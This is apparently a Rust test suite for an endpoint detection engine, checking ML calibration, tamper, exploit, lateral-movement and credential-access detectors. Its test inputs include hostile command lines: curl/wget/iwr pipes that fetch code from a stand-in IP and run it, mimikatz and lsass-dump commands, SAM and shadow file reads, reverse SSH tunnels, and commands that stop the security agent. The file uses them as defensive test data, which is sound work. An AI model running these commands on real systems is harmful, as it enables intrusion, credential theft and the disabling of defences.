//! Synthetic regressions ported from the A3/A4 audit harnesses (no customer rows).
use detection::{
    BehavioralEngine, Confidence, DetectionEngine, DetectionSignals, EventClass, MlEngine,
    MlExtraContext, MlFeatures, MlModel, TelemetryEvent,
};

fn event(process: &str, cmd: &str) -> TelemetryEvent {
    serde_json::from_value(serde_json::json!({
        "ts_unix": 1, "event_class": "ProcessExec", "pid": 42, "ppid": 1,
        "uid": 0, "process": process, "parent_process": "init", "session_id": 1,
        "file_write": false, "command_line": cmd,
        "container_escape": false, "container_privileged": false
    }))
    .unwrap()
}
fn features(e: &TelemetryEvent) -> MlFeatures {
    MlFeatures::extract(
        e,
        &DetectionSignals::default(),
        0,
        0,
        0,
        0,
        0,
        &MlExtraContext::default(),
    )
}
fn encoded() -> String {
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".repeat(3)
}

#[test]
fn rafix_uncalibrated_ml_is_advisory_even_at_extreme_scores() {
    let mut model = MlModel::default();
    model.bias = 20.0;
    model.weights.fill(0.0);
    let mut ml = MlEngine::with_model(model);
    let f = features(&event("svchost.exe", "svchost.exe -k netsvcs"));
    for n in [None, Some(0), Some(99)] {
        if let Some(n) = n {
            ml.load_calibration(vec![0.1; n], 0.01);
        }
        let score = ml.score(&f);
        assert!(score.raw_positive);
        assert!(!score.positive, "uncalibrated positive: {score:?}");
        assert!(score.conformal_gated);
        assert!(!ml.has_calibration());
    }
    ml.load_calibration(vec![0.1; 100], 0.01);
    assert!(ml.has_calibration());
    assert!(ml.score(&f).positive);
}

#[test]
fn rafix_windows_uid_zero_is_not_unix_root() {
    for p in ["svchost.exe", "chrome.exe"] {
        assert_eq!(features(&event(p, p)).values[8], 0.0);
    }
    assert_eq!(features(&event("bash", "bash -c id")).values[8], 1.0);
}

#[test]
fn rafix_benign_exec_stream_has_no_cadence_alarms() {
    // Run calibrated too: fail-closed gating must not hide a broken detector.
    for calibrated in [false, true] {
        let mut b = BehavioralEngine::new();
        if calibrated {
            b.calibrate(vec![0.1; 100], 0.01);
        }
        for i in 0..1200 {
            let mut e = match i % 3 {
                0 => event(
                    "chrome.exe",
                    &format!(
                        "chrome.exe --type=renderer --field-trial-handle={} --gpu-preferences={}",
                        i,
                        encoded()
                    ),
                ),
                1 => event("svchost.exe", "svchost.exe -k netsvcs -p -s Schedule"),
                _ => event("git.exe", "git.exe status --porcelain --branch"),
            };
            e.ts_unix = i;
            assert!(b.observe(&e).is_empty(), "cadence alarm at {i}");
        }
    }
}

#[test]
fn rafix_encoded_blob_is_low_magnitude_and_requires_mature_calibration() {
    let e = event(
        "powershell.exe",
        &format!("powershell.exe -enc {}", encoded()),
    );
    for n in [0, 99, 100] {
        let mut b = BehavioralEngine::new();
        if n > 0 {
            b.calibrate(vec![0.1; n], 0.01);
        }
        let alarms = b.observe(&e);
        assert_eq!(alarms.len(), 1);
        assert_eq!(alarms[0].dimension, "cmdline_encoded_blob");
        assert_eq!(alarms[0].magnitude, 1.5);
        assert_eq!(alarms[0].gated, n >= 100);
    }
}

#[test]
fn rafix_service_dns_is_quiet_but_distinct_tunnel_labels_fire() {
    let mut b = BehavioralEngine::new();
    b.calibrate(vec![0.1; 100], 0.01);
    let hosts = [
        "settings-win.data.microsoft.com",
        "clientservices.googleapis.com",
        "optimizationguide-pa.googleapis.com",
        "r3---sn-2uuxa3vh-jb3l.googlevideo.com",
    ];
    let mut e = event("svchost.exe", "");
    e.event_class = EventClass::DnsQuery;
    for i in 0..200 {
        e.ts_unix = i;
        e.dst_domain = Some(hosts[i as usize % hosts.len()].into());
        assert!(b.observe(&e).is_empty());
    }
    let mut hits = 0;
    for i in 0..40 {
        e.ts_unix = 200 + i;
        e.dst_domain = Some(format!("aZ7qL2mN9xR4vB6kP{:02}.t.attacker.net", i));
        for a in b.observe(&e) {
            if a.dimension == "dns_tunnel" {
                assert!(a.gated);
                assert_eq!(a.magnitude, 1.5);
                hits += 1;
            }
        }
    }
    assert!(hits > 0);
}

#[test]
fn rafix_tamper_needs_file_mutation_not_self_reexec_or_reads() {
    for (p, path, class, write) in [
        ("chrome", "/proc/self/exe", EventClass::ProcessExec, false),
        ("runc", "/proc/self/exe", EventClass::ProcessExec, false),
        ("aide", "/usr/bin/eguard-agent", EventClass::FileOpen, false),
        (
            "tar",
            "/etc/eguard-agent/agent.conf",
            EventClass::FileOpen,
            false,
        ),
        (
            "dpkg",
            "/usr/bin/eguard-agent.dpkg-new",
            EventClass::FileOpen,
            true,
        ),
        (
            "eguard-agent",
            "/usr/bin/eguard-agent",
            EventClass::ProcessExec,
            false,
        ),
        (
            "bash",
            "/tmp/etc/eguard-agent/agent.conf",
            EventClass::FileOpen,
            true,
        ),
    ] {
        let mut e = event(p, "");
        e.file_path = Some(path.into());
        e.event_class = class;
        e.file_write = write;
        assert!(
            detection::detect_tamper_indicators(&e).is_empty(),
            "{p}: {path}"
        );
    }
    let mut e = event("bash", "");
    e.event_class = EventClass::FileOpen;
    e.file_path = Some("/etc/eguard-agent/agent.conf".into());
    e.file_write = true;
    assert_eq!(
        detection::detect_tamper_indicators(&e),
        ["tamper:agent_file_mutation"]
    );
}

#[test]
fn rafix_ml_never_upgrades_rule_confidence() {
    let mut d = DetectionEngine::default_with_rules();
    let mut model = MlModel::default();
    model.bias = 20.0;
    model.weights.fill(0.0);
    d.layer5.reload_model(model).unwrap();
    d.layer5.load_calibration(vec![0.1; 100], 0.01);
    let o = d.process_event(&event("svchost.exe", "svchost.exe -k netsvcs"));
    assert_eq!(o.confidence, Confidence::Low);
}

#[test]
fn rafix_exploit_requires_execution_not_data_processing() {
    for cmd in [
        "sh -c 'curl -s http://127.0.0.1:8080/status | python3 -m json.tool'",
        "sh -c 'git fetch origin && git log | python3 tools/changelog.py'",
        "sh -c 'curl -s https://api.example.test/r | perl -ne print'",
        "sh -c 'curl https://vault.example.test/key | jq -r .key | base64 -d > app.key'",
        "base64 -d /var/lib/kubelet/pods/00000000-0000-0000-0000-000000000000/volumes/secret/ca.b64 > /tmp/ca.crt",
        "LD_PRELOAD=/usr/lib/libjemalloc.so.2 redis-server --dir /tmp/",
    ] {
        assert!(exploit(&event("sh", cmd)).is_empty(), "{cmd}");
    }
    for cmd in [
        "sh -c 'curl -s http://198.51.100.7/x | bash'",
        "sh -c 'wget -qO- http://198.51.100.7/p.py | python3'",
        "powershell 'iwr http://198.51.100.7/a | iex'",
        "sh -c 'curl -s http://x.test/p | base64 -d | bash'",
    ] {
        assert!(!exploit(&event("sh", cmd)).is_empty(), "{cmd}");
    }
    let mut e = event("sh", "LD_PRELOAD=/tmp/ci/libasan.so.8 ./unit_tests");
    e.parent_process = "gitlab-runner".into();
    assert!(exploit(&e).is_empty());
}

#[test]
fn rafix_fileless_needs_resolved_image_and_excludes_runc_clone() {
    for invocation in ["/proc/self/fd/3", "/proc/4242/fd/3", "/dev/fd/3"] {
        let mut e = event("payload", "payload");
        e.file_path = Some(invocation.into());
        e.process_exe = Some("/memfd:stage (deleted)".into());
        e.parent_process = "python3".into();
        assert_eq!(exploit(&e), ["fileless_fd_exec"]);
        e.process_exe = Some("/usr/lib/systemd/systemd-executor".into());
        assert!(exploit(&e).is_empty());
        e.process_exe = Some("/memfd:runc_cloned:/proc/self/exe (deleted)".into());
        e.parent_process = "runc".into();
        assert!(exploit(&e).is_empty());
    }
    let mut e = event("chrome", "chrome --type=zygote");
    e.file_path = Some("/proc/self/exe".into());
    e.process_exe = Some("/opt/google/chrome/chrome".into());
    assert!(exploit(&e).is_empty());
}

fn exploit(e: &TelemetryEvent) -> Vec<String> {
    DetectionEngine::default_with_rules()
        .process_event(e)
        .exploit_indicators
}

#[test]
fn rafix_exploit_context_is_not_high_and_shm_attack_stays_high() {
    for (exe, cmd, parent, expected) in [
        (
            "/usr/bin/sh",
            "LD_PRELOAD=/dev/shm/.l.so /usr/sbin/sshd",
            "init",
            Confidence::Medium,
        ),
        (
            "/usr/bin/sh",
            "curl -fsSL https://x.example.test/i.sh | sudo bash",
            "init",
            Confidence::Medium,
        ),
        ("/tmp/.x/xmrig", "xmrig", "bash", Confidence::Medium),
        ("/dev/shm/kdevtmpfsi", "kdevtmpfsi", "sh", Confidence::High),
        (
            "/tmp/go-build123/b001/exe/main",
            "main",
            "go",
            Confidence::None,
        ),
    ] {
        let mut e = event("sh", cmd);
        e.process_exe = Some(exe.into());
        e.parent_process = parent.into();
        let o = DetectionEngine::default_with_rules().process_event(&e);
        assert_eq!(
            o.confidence, expected,
            "{exe} {cmd}: {:?}",
            o.exploit_indicators
        );
        assert_eq!(o.signals.exploit_indicator, expected == Confidence::High);
    }
    let mut e = event("sh", "");
    e.event_class = EventClass::FileOpen;
    e.file_path = Some("/etc/eguard-agent/agent.conf".into());
    e.file_unlink = true;
    assert_eq!(
        detection::detect_tamper_indicators(&e),
        ["tamper:agent_file_mutation"]
    );
}

#[test]
fn rafix_kernel_inventory_is_not_strong_and_known_rootkits_still_fire() {
    for module in [
        "xt_mark",
        "xt_connmark",
        "act_connmark",
        "ark3116",
        "IONetworkingFamily",
    ] {
        let mut e = event("modprobe", "");
        e.event_class = EventClass::ModuleLoad;
        e.file_path = Some(module.into());
        let o = DetectionEngine::default_with_rules().process_event(&e);
        assert!(o.kernel_integrity_indicators.is_empty(), "{module}");
    }
    for module in ["diamorphine", "reptile_module", "suterusu"] {
        let mut e = event("insmod", "");
        e.event_class = EventClass::ModuleLoad;
        e.file_path = Some(format!("/tmp/{module}.ko"));
        let o = DetectionEngine::default_with_rules().process_event(&e);
        assert!(o.signals.kernel_integrity);
        assert_eq!(o.confidence, Confidence::High);
    }
    for indicator in [
        "ftrace_filter_count:1",
        "ftrace_tracer:function",
        "kprobe_hook:__x64_sys_getdents64",
        "unsigned_oot_module:dkms_new",
        "bpffs_pinned_object:lsm_hide",
    ] {
        let mut e = event("kernel_integrity_scan", &format!("indicators={indicator}"));
        e.event_class = EventClass::Alert;
        let o = DetectionEngine::default_with_rules().process_event(&e);
        assert!(!o.signals.kernel_integrity, "{indicator}");
        assert_eq!(o.confidence, Confidence::Medium, "{indicator}");
    }
}

#[test]
fn rafix_cmdline_features_measure_blob_not_every_short_command() {
    for cmd in [
        "svchost.exe -k netsvcs -p -s Schedule",
        "git status --porcelain",
    ] {
        assert_eq!(
            &features(&event("svchost.exe", cmd)).values[14..18],
            &[0.0; 4]
        );
    }
    let f = features(&event(
        "powershell.exe",
        &format!("powershell.exe -enc {}", encoded()),
    ));
    assert_eq!(&f.values[14..18], &[1.0, 0.0, 0.0, 0.0]);
}
#[test]
fn rafix_credential_feature_uses_exact_terms_and_reader_exclusions() {
    for (proc, cmd, class, path, expected) in [
        (
            "git-credential-manager.exe",
            "git-credential-manager.exe get",
            EventClass::ProcessExec,
            "",
            0.0,
        ),
        ("vault", "vault status", EventClass::ProcessExec, "", 0.0),
        (
            "mimikatz.exe",
            "sekurlsa::logonpasswords",
            EventClass::ProcessExec,
            "",
            1.0,
        ),
        (
            "getent",
            "getent passwd",
            EventClass::FileOpen,
            "/etc/passwd",
            0.0,
        ),
        (
            "bash",
            "cat /etc/shadow",
            EventClass::FileOpen,
            "/etc/shadow",
            1.0,
        ),
        ("unix_chkpwd", "", EventClass::FileOpen, "/etc/shadow", 0.0),
        (
            "aws",
            "",
            EventClass::FileOpen,
            "/home/fixture/.aws/credentials",
            0.0,
        ),
    ] {
        let mut e = event(proc, cmd);
        e.event_class = class;
        e.file_path = Some(path.into());
        assert_eq!(features(&e).values[42], expected, "{proc} {path}");
    }
}
#[test]
fn rafix_lsass_feature_needs_dump_context() {
    for (cmd, expected) in [
        (
            r"rundll32.exe C:\Windows\System32\PcaSvc.dll,PcaPatchSdbTask",
            0.0,
        ),
        (r"rundll32.exe shell32.dll,Control_RunDLL", 0.0),
        (
            r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\l.dmp full",
            1.0,
        ),
        ("procdump64.exe -ma lsass.exe l.dmp", 1.0),
        ("procdump64.exe -ma w3wp.exe", 0.0),
    ] {
        assert_eq!(
            features(&event("rundll32.exe", cmd)).values[43],
            expected,
            "{cmd}"
        );
    }
}
#[test]
fn rafix_sam_feature_has_hive_boundaries() {
    for (cmd, expected) in [
        ("chrome.exe --enable-features=SameSiteByDefaultCookies", 0.0),
        ("python3 sample.py --samples 10", 0.0),
        (r"reg.exe save HKLM\SAM C:\s.hiv", 1.0),
    ] {
        assert_eq!(
            features(&event("reg.exe", cmd)).values[44],
            expected,
            "{cmd}"
        );
    }
}
#[test]
fn rafix_token_feature_is_not_oauth_or_exploit_echo() {
    for (cmd, expected) in [
        ("az account get-access-token", 0.0),
        ("gh auth token", 0.0),
        ("kubectl --token=fixture get pods", 0.0),
        ("mimikatz token::elevate", 1.0),
    ] {
        assert_eq!(
            features(&event("cmd.exe", cmd)).values[45],
            expected,
            "{cmd}"
        );
    }
    let f = MlFeatures::extract(
        &event("sh", "id"),
        &DetectionSignals {
            exploit_indicator: true,
            ..Default::default()
        },
        0,
        0,
        0,
        0,
        0,
        &Default::default(),
    );
    assert_eq!(f.values[45], 0.0);
}
#[test]
fn rafix_feature_names_normalize_windows_and_python3() {
    for parent in [r"C:\Program Files\Office\WINWORD.EXE", "python3.14"] {
        let mut e = event("powershell.exe", "powershell.exe -c id");
        e.parent_process = parent.into();
        assert_eq!(features(&e).values[28], 0.8, "{parent}");
    }
    let mut e = event("powershell.exe", "mimikatz token::elevate");
    e.parent_process = "explorer.exe".into();
    assert_eq!(features(&e).values[28], 0.2);
    assert!(features(&e).values[46] > 0.0);
}
#[test]
fn rafix_file_features_use_mutation_and_real_extensions() {
    let mut e = event("chrome.exe", "");
    e.event_class = EventClass::FileOpen;
    e.file_path = Some("/tmp/cache.tmp.old".into());
    assert_eq!(features(&e).values[33], 0.0);
    e.file_write = true;
    e.file_path = Some("/run/user/1000/bus.sock".into());
    assert_eq!(features(&e).values[35], 0.0);
    e.file_path = Some(r"C:\Windows\System32\evil.dll".into());
    assert_eq!(features(&e).values[35], 1.0);
    assert_eq!(features(&e).values[36], 0.15);
}
#[test]
fn rafix_network_features_do_not_invent_fanout_or_private_172_slash8() {
    let mut e = event("svchost.exe", "");
    e.event_class = EventClass::NetworkConnect;
    for (ip, port, risk, public) in [
        ("10.0.0.5", 445, 0.3, 0.0),
        ("172.217.0.1", 443, 0.1, 1.0),
        ("45.33.12.9", 4444, 0.95, 1.0),
        ("::1", 5555, 0.3, 0.0),
    ] {
        e.dst_ip = Some(ip.into());
        e.dst_port = Some(port);
        let f = features(&e);
        assert_eq!(f.values[9], risk);
        assert_eq!(f.values[38], public);
        for i in [37, 39, 41] {
            assert_eq!(f.values[i], 0.0);
        }
    }
}
#[test]
fn rafix_placeholder_metadata_features_are_zero_for_model_compatibility() {
    let e = event("svchost.exe", "svchost.exe -k netsvcs");
    let f = features(&e);
    let model = MlModel::default();
    for i in [15, 16, 17, 19, 21, 22, 27, 29, 30, 31, 37, 39, 41] {
        assert_eq!(f.values[i], 0.0, "feature {i}");
        assert_eq!(model.weights[i], 0.0, "weight {i}");
    }
}

#[test]
fn rafix_ci_models_require_real_labels_and_mature_calibration() {
    let good = serde_json::json!({"model_version":"fixture", "features":["z1_ioc_hit"],
        "weights":{"z1_ioc_hit":1.0}, "bias":-1.0, "label_source":"adjudicated",
        "calibration_scores": vec![0.1; 100] });
    let parse = |v: &serde_json::Value| {
        detection::layer5::CiTrainedModel::from_json(&v.to_string()).unwrap()
    };
    assert!(parse(&good).validate().is_ok());
    let mut bad = good.clone();
    bad["label_source"] = "synthetic_ci".into();
    assert!(parse(&bad).validate().is_err());
    bad = good.clone();
    bad.as_object_mut().unwrap().remove("label_source");
    assert!(parse(&bad).validate().is_err());
    bad = good.clone();
    bad["calibration_scores"] = serde_json::json!(vec![0.1; 99]);
    assert!(parse(&bad).validate().is_err());
}
#[test]
fn rafix_tree_model_rejects_unknown_runtime_feature_names() {
    let mut json = serde_json::to_value(MlModel::default()).unwrap();
    json["family"] = "gbdt_tree".into();
    json["trees"] = serde_json::json!([{ "weight":1.0, "nodes":[
        {"id":0,"feature":"rule_severity","threshold":0.5,"left":1,"right":2},
        {"id":1,"leaf":-1.0}, {"id":2,"leaf":1.0} ] }]);
    assert!(MlModel::from_json(&json.to_string()).is_err());
    json["trees"][0]["nodes"][0]["feature"] = "z1_ioc_hit".into();
    assert!(MlModel::from_json(&json.to_string()).is_ok());
}

#[test]
fn rafix_linux_service_control_is_named_medium_not_file_tamper() {
    for (process, cmd) in [
        ("systemctl", "systemctl mask eguard-agent"),
        ("systemctl", "systemctl disable --now eguard-agent.service"),
        ("service", "service eguard-agent stop"),
        ("pkill", "pkill eguard-agent"),
    ] {
        let mut e = event(process, cmd);
        let o = DetectionEngine::default_with_rules().process_event(&e);
        assert_eq!(o.tamper_indicators, ["tamper:agent_service_control"]);
        assert_eq!(o.confidence, Confidence::Medium);
        assert!(!o.signals.tamper_indicator);
        e.parent_process = "dpkg".into();
        assert!(detection::detect_tamper_indicators(&e).is_empty());
    }
    for cmd in [
        "systemctl status eguard-agent",
        "systemctl mask nginx",
        "systemctl mask eguard-agent-helper",
    ] {
        assert!(detection::detect_tamper_indicators(&event("systemctl", cmd)).is_empty());
    }
}

#[test]
fn rafix_calibration_does_not_survive_a_model_change() {
    let mut ml = MlEngine::new();
    ml.load_calibration(vec![0.1; 100], 0.01);
    assert!(ml.has_calibration());
    ml.reload_model(MlModel::default()).unwrap();
    assert!(!ml.has_calibration());
}

#[test]
fn rafix_unwired_hunting_has_no_placeholder_or_inventory_highs() {
    let queries = detection::threat_hunting::default_hunting_queries();
    assert_eq!(queries.len(), 1);
    assert_eq!(queries[0].name, "cryptominer_detection");
    assert!(!detection::match_process_pattern(
        "minerd|cgminer",
        "minerd-exporter"
    ));
    assert!(!detection::match_process_pattern(
        "minerd|cgminer",
        "cgminer-docs"
    ));
    assert!(detection::match_process_pattern(
        "xmrig|minerd",
        "/tmp/.x/xmrig"
    ));
}
#[test]
fn rafix_deception_has_no_predeployed_real_user_files() {
    let mut d = detection::DeceptionEngine::new();
    assert!(d.token_paths().is_empty());
    assert!(d
        .check_file_access(r"C:\Users\Administrator\.aws\credentials", "aws.exe", 42)
        .is_none());
    let path = "/var/lib/eguard-agent/decoy/synthetic-4a7f.aws";
    d.add_token(detection::DeceptionToken {
        name: "synthetic".into(),
        token_type: detection::TokenType::CredentialFile,
        path: path.into(),
        deployed: true,
        triggered_count: 0,
    });
    assert_eq!(
        d.check_file_access(path, "tar", 42).unwrap().confidence,
        "low"
    );
    assert_eq!(
        d.check_file_access(path, "bash", 43).unwrap().confidence,
        "high"
    );
}
#[test]
fn rafix_unknown_posture_is_not_a_quarantine_decision() {
    use detection::zero_trust::*;
    let mut factors = default_factors();
    assert_eq!(
        compute_score(&factors, 1).recommendation,
        TrustAction::Restrict
    );
    factors[0] = compliance_factor(true, false);
    let result = compute_score(&factors, 1);
    assert_eq!(result.score, 100);
    assert_eq!(result.recommendation, TrustAction::Restrict);
    factors = vec![
        compliance_factor(false, false),
        cve_factor(5),
        fim_factor(false, false),
        detection_history_factor(3),
    ];
    assert_eq!(
        compute_score(&factors, 1).recommendation,
        TrustAction::Quarantine
    );
}

#[test]
fn rafix_lateral_tools_need_exact_tool_and_argument_context() {
    use detection::LateralMovementDetector;
    for (p, cmd) in [
        ("schtasks", "schtasks /query /fo LIST"),
        ("mstsc.exe", "mstsc.exe /v:server01"),
        ("wmic", "wmic logicaldisk get size"),
        ("sadc", "sadc -F -L -S DISK 1 1 /var/log/sysstat"),
        ("curl", "curl -L https://fixture.test"),
        ("cp", "cp -R a b"),
        ("lsass.exe", "lsass.exe"),
        ("procdump64.exe", "procdump64.exe -ma w3wp.exe"),
    ] {
        assert!(
            LateralMovementDetector::new()
                .check_event(&event(p, cmd))
                .is_none(),
            "{cmd}"
        );
    }
    for (p, cmd) in [
        ("PSEXESVC.exe", "PSEXESVC.exe"),
        ("python3", "python3 wmiexec.py corp/admin@10.0.0.5"),
        ("ssh", "ssh -fNR 9000:localhost:22 user@203.0.113.5"),
        ("ssh", "ssh -D 1080 -N host"),
        ("mimikatz.exe", "mimikatz.exe sekurlsa::logonpasswords"),
        ("procdump64.exe", "procdump64.exe -ma lsass.exe l.dmp"),
    ] {
        assert!(
            LateralMovementDetector::new()
                .check_event(&event(p, cmd))
                .is_some(),
            "{cmd}"
        );
    }
}
#[test]
fn rafix_lateral_credential_paths_exclude_auth_stack_and_passwd() {
    for (p, path, hit) in [
        ("id", "/etc/passwd", false),
        ("unix_chkpwd", "/etc/shadow", false),
        ("bash", "/etc/shadow", true),
        ("lsass.exe", r"C:\Windows\System32\config\SAM", false),
        (
            "cmd.exe",
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM",
            true,
        ),
    ] {
        let mut e = event(p, "");
        e.event_class = EventClass::FileOpen;
        e.file_path = Some(path.into());
        assert_eq!(
            detection::LateralMovementDetector::new()
                .check_event(&e)
                .is_some(),
            hit,
            "{p} {path}"
        );
    }
}

#[test]
fn rafix_fim_defaults_do_not_monitor_routine_network_or_boot_churn() {
    for path in detection::fim::default_fim_paths() {
        let p = path
            .to_string_lossy()
            .replace('\\', "/")
            .to_ascii_lowercase();
        assert!(
            !matches!(p.as_str(), "/etc/resolv.conf" | "/etc/hosts") && !p.starts_with("/boot/")
        );
        assert!(!["/config/sam", "/config/security", "/config/system"]
            .iter()
            .any(|s| p.ends_with(s)));
    }
}
#[test]
fn rafix_usb_wireless_class_is_not_blanket_network() {
    use detection::usb_control::*;
    assert_ne!(parse_usb_class(0xe0), UsbDeviceClass::Network);
    assert_eq!(parse_usb_class(0x02), UsbDeviceClass::Network);
    assert_eq!(parse_usb_class(0x08), UsbDeviceClass::MassStorage);
}

#[test]
fn rafix_unversioned_module_cve_is_inventory_not_exploit_evidence() {
    let mut d = DetectionEngine::default_with_rules();
    d.cve.load([serde_json::from_value(serde_json::json!({"cve_id":"CVE-2099-0001", "cvss":9.8,
        "actively_exploited":true, "affected_packages":[{"product":"openssl", "version_end":"3.0.1"}]})).unwrap()]);
    let mut e = event("loader", "");
    e.event_class = EventClass::ModuleLoad;
    e.file_path = Some("/usr/lib/libssl.so.3".into());
    assert!(!d.process_event(&e).signals.vulnerable_software);
    assert!(!d.cve.check_package("openssl", "3.0.0").is_empty());
    assert!(d.cve.check_package("openssl", "3.0.2").is_empty());
}

#[test]
fn rafix_replay_attributes_heuristic_behavioral_and_ml_causes() {
    let mut e = event("bash", "");
    e.event_class = EventClass::FileOpen;
    e.file_write = true;
    e.file_path = Some("/etc/eguard-agent/agent.conf".into());
    let mut d = DetectionEngine::default_with_rules();
    let summary = detection::replay_events(&mut d, &[e]);
    assert!(summary.alerts[0]
        .rule_hits
        .contains(&"tamper:tamper:agent_file_mutation".into()));
    let mut d = DetectionEngine::default_with_rules();
    d.behavioral.calibrate(vec![0.1; 100], 0.01);
    let e = event(
        "powershell.exe",
        &format!("powershell.exe -enc {}", encoded()),
    );
    let summary = detection::replay_events(&mut d, &[e]);
    assert!(summary.alerts[0]
        .rule_hits
        .contains(&"behavioral:cmdline_encoded_blob".into()));
    let mut d = DetectionEngine::default_with_rules();
    let mut model = MlModel::default();
    model.bias = 20.0;
    model.weights.fill(0.0);
    d.layer5.reload_model(model).unwrap();
    d.layer5.load_calibration(vec![0.1; 100], 0.01);
    let summary =
        detection::replay_events(&mut d, &[event("svchost.exe", "svchost.exe -k netsvcs")]);
    assert!(summary.alerts[0].rule_hits.contains(&"ml:positive".into()));
}

#[test]
fn rafix_only_gated_behavioral_alarms_enter_ml_alarm_count() {
    for calibrated in [false, true] {
        let mut d = DetectionEngine::default_with_rules();
        let mut model = MlModel::default();
        model.weights.fill(0.0);
        model.weights[23] = 1.0;
        model.bias = 0.0;
        d.layer5.reload_model(model).unwrap();
        if calibrated {
            d.behavioral.calibrate(vec![0.1; 100], 0.01);
        }
        let o = d.process_event(&event(
            "powershell.exe",
            &format!("powershell.exe -enc {}", encoded()),
        ));
        let score = o.ml_score.unwrap().score;
        if calibrated {
            assert!(score > 0.5);
        } else {
            assert_eq!(score, 0.5);
        }
    }
}
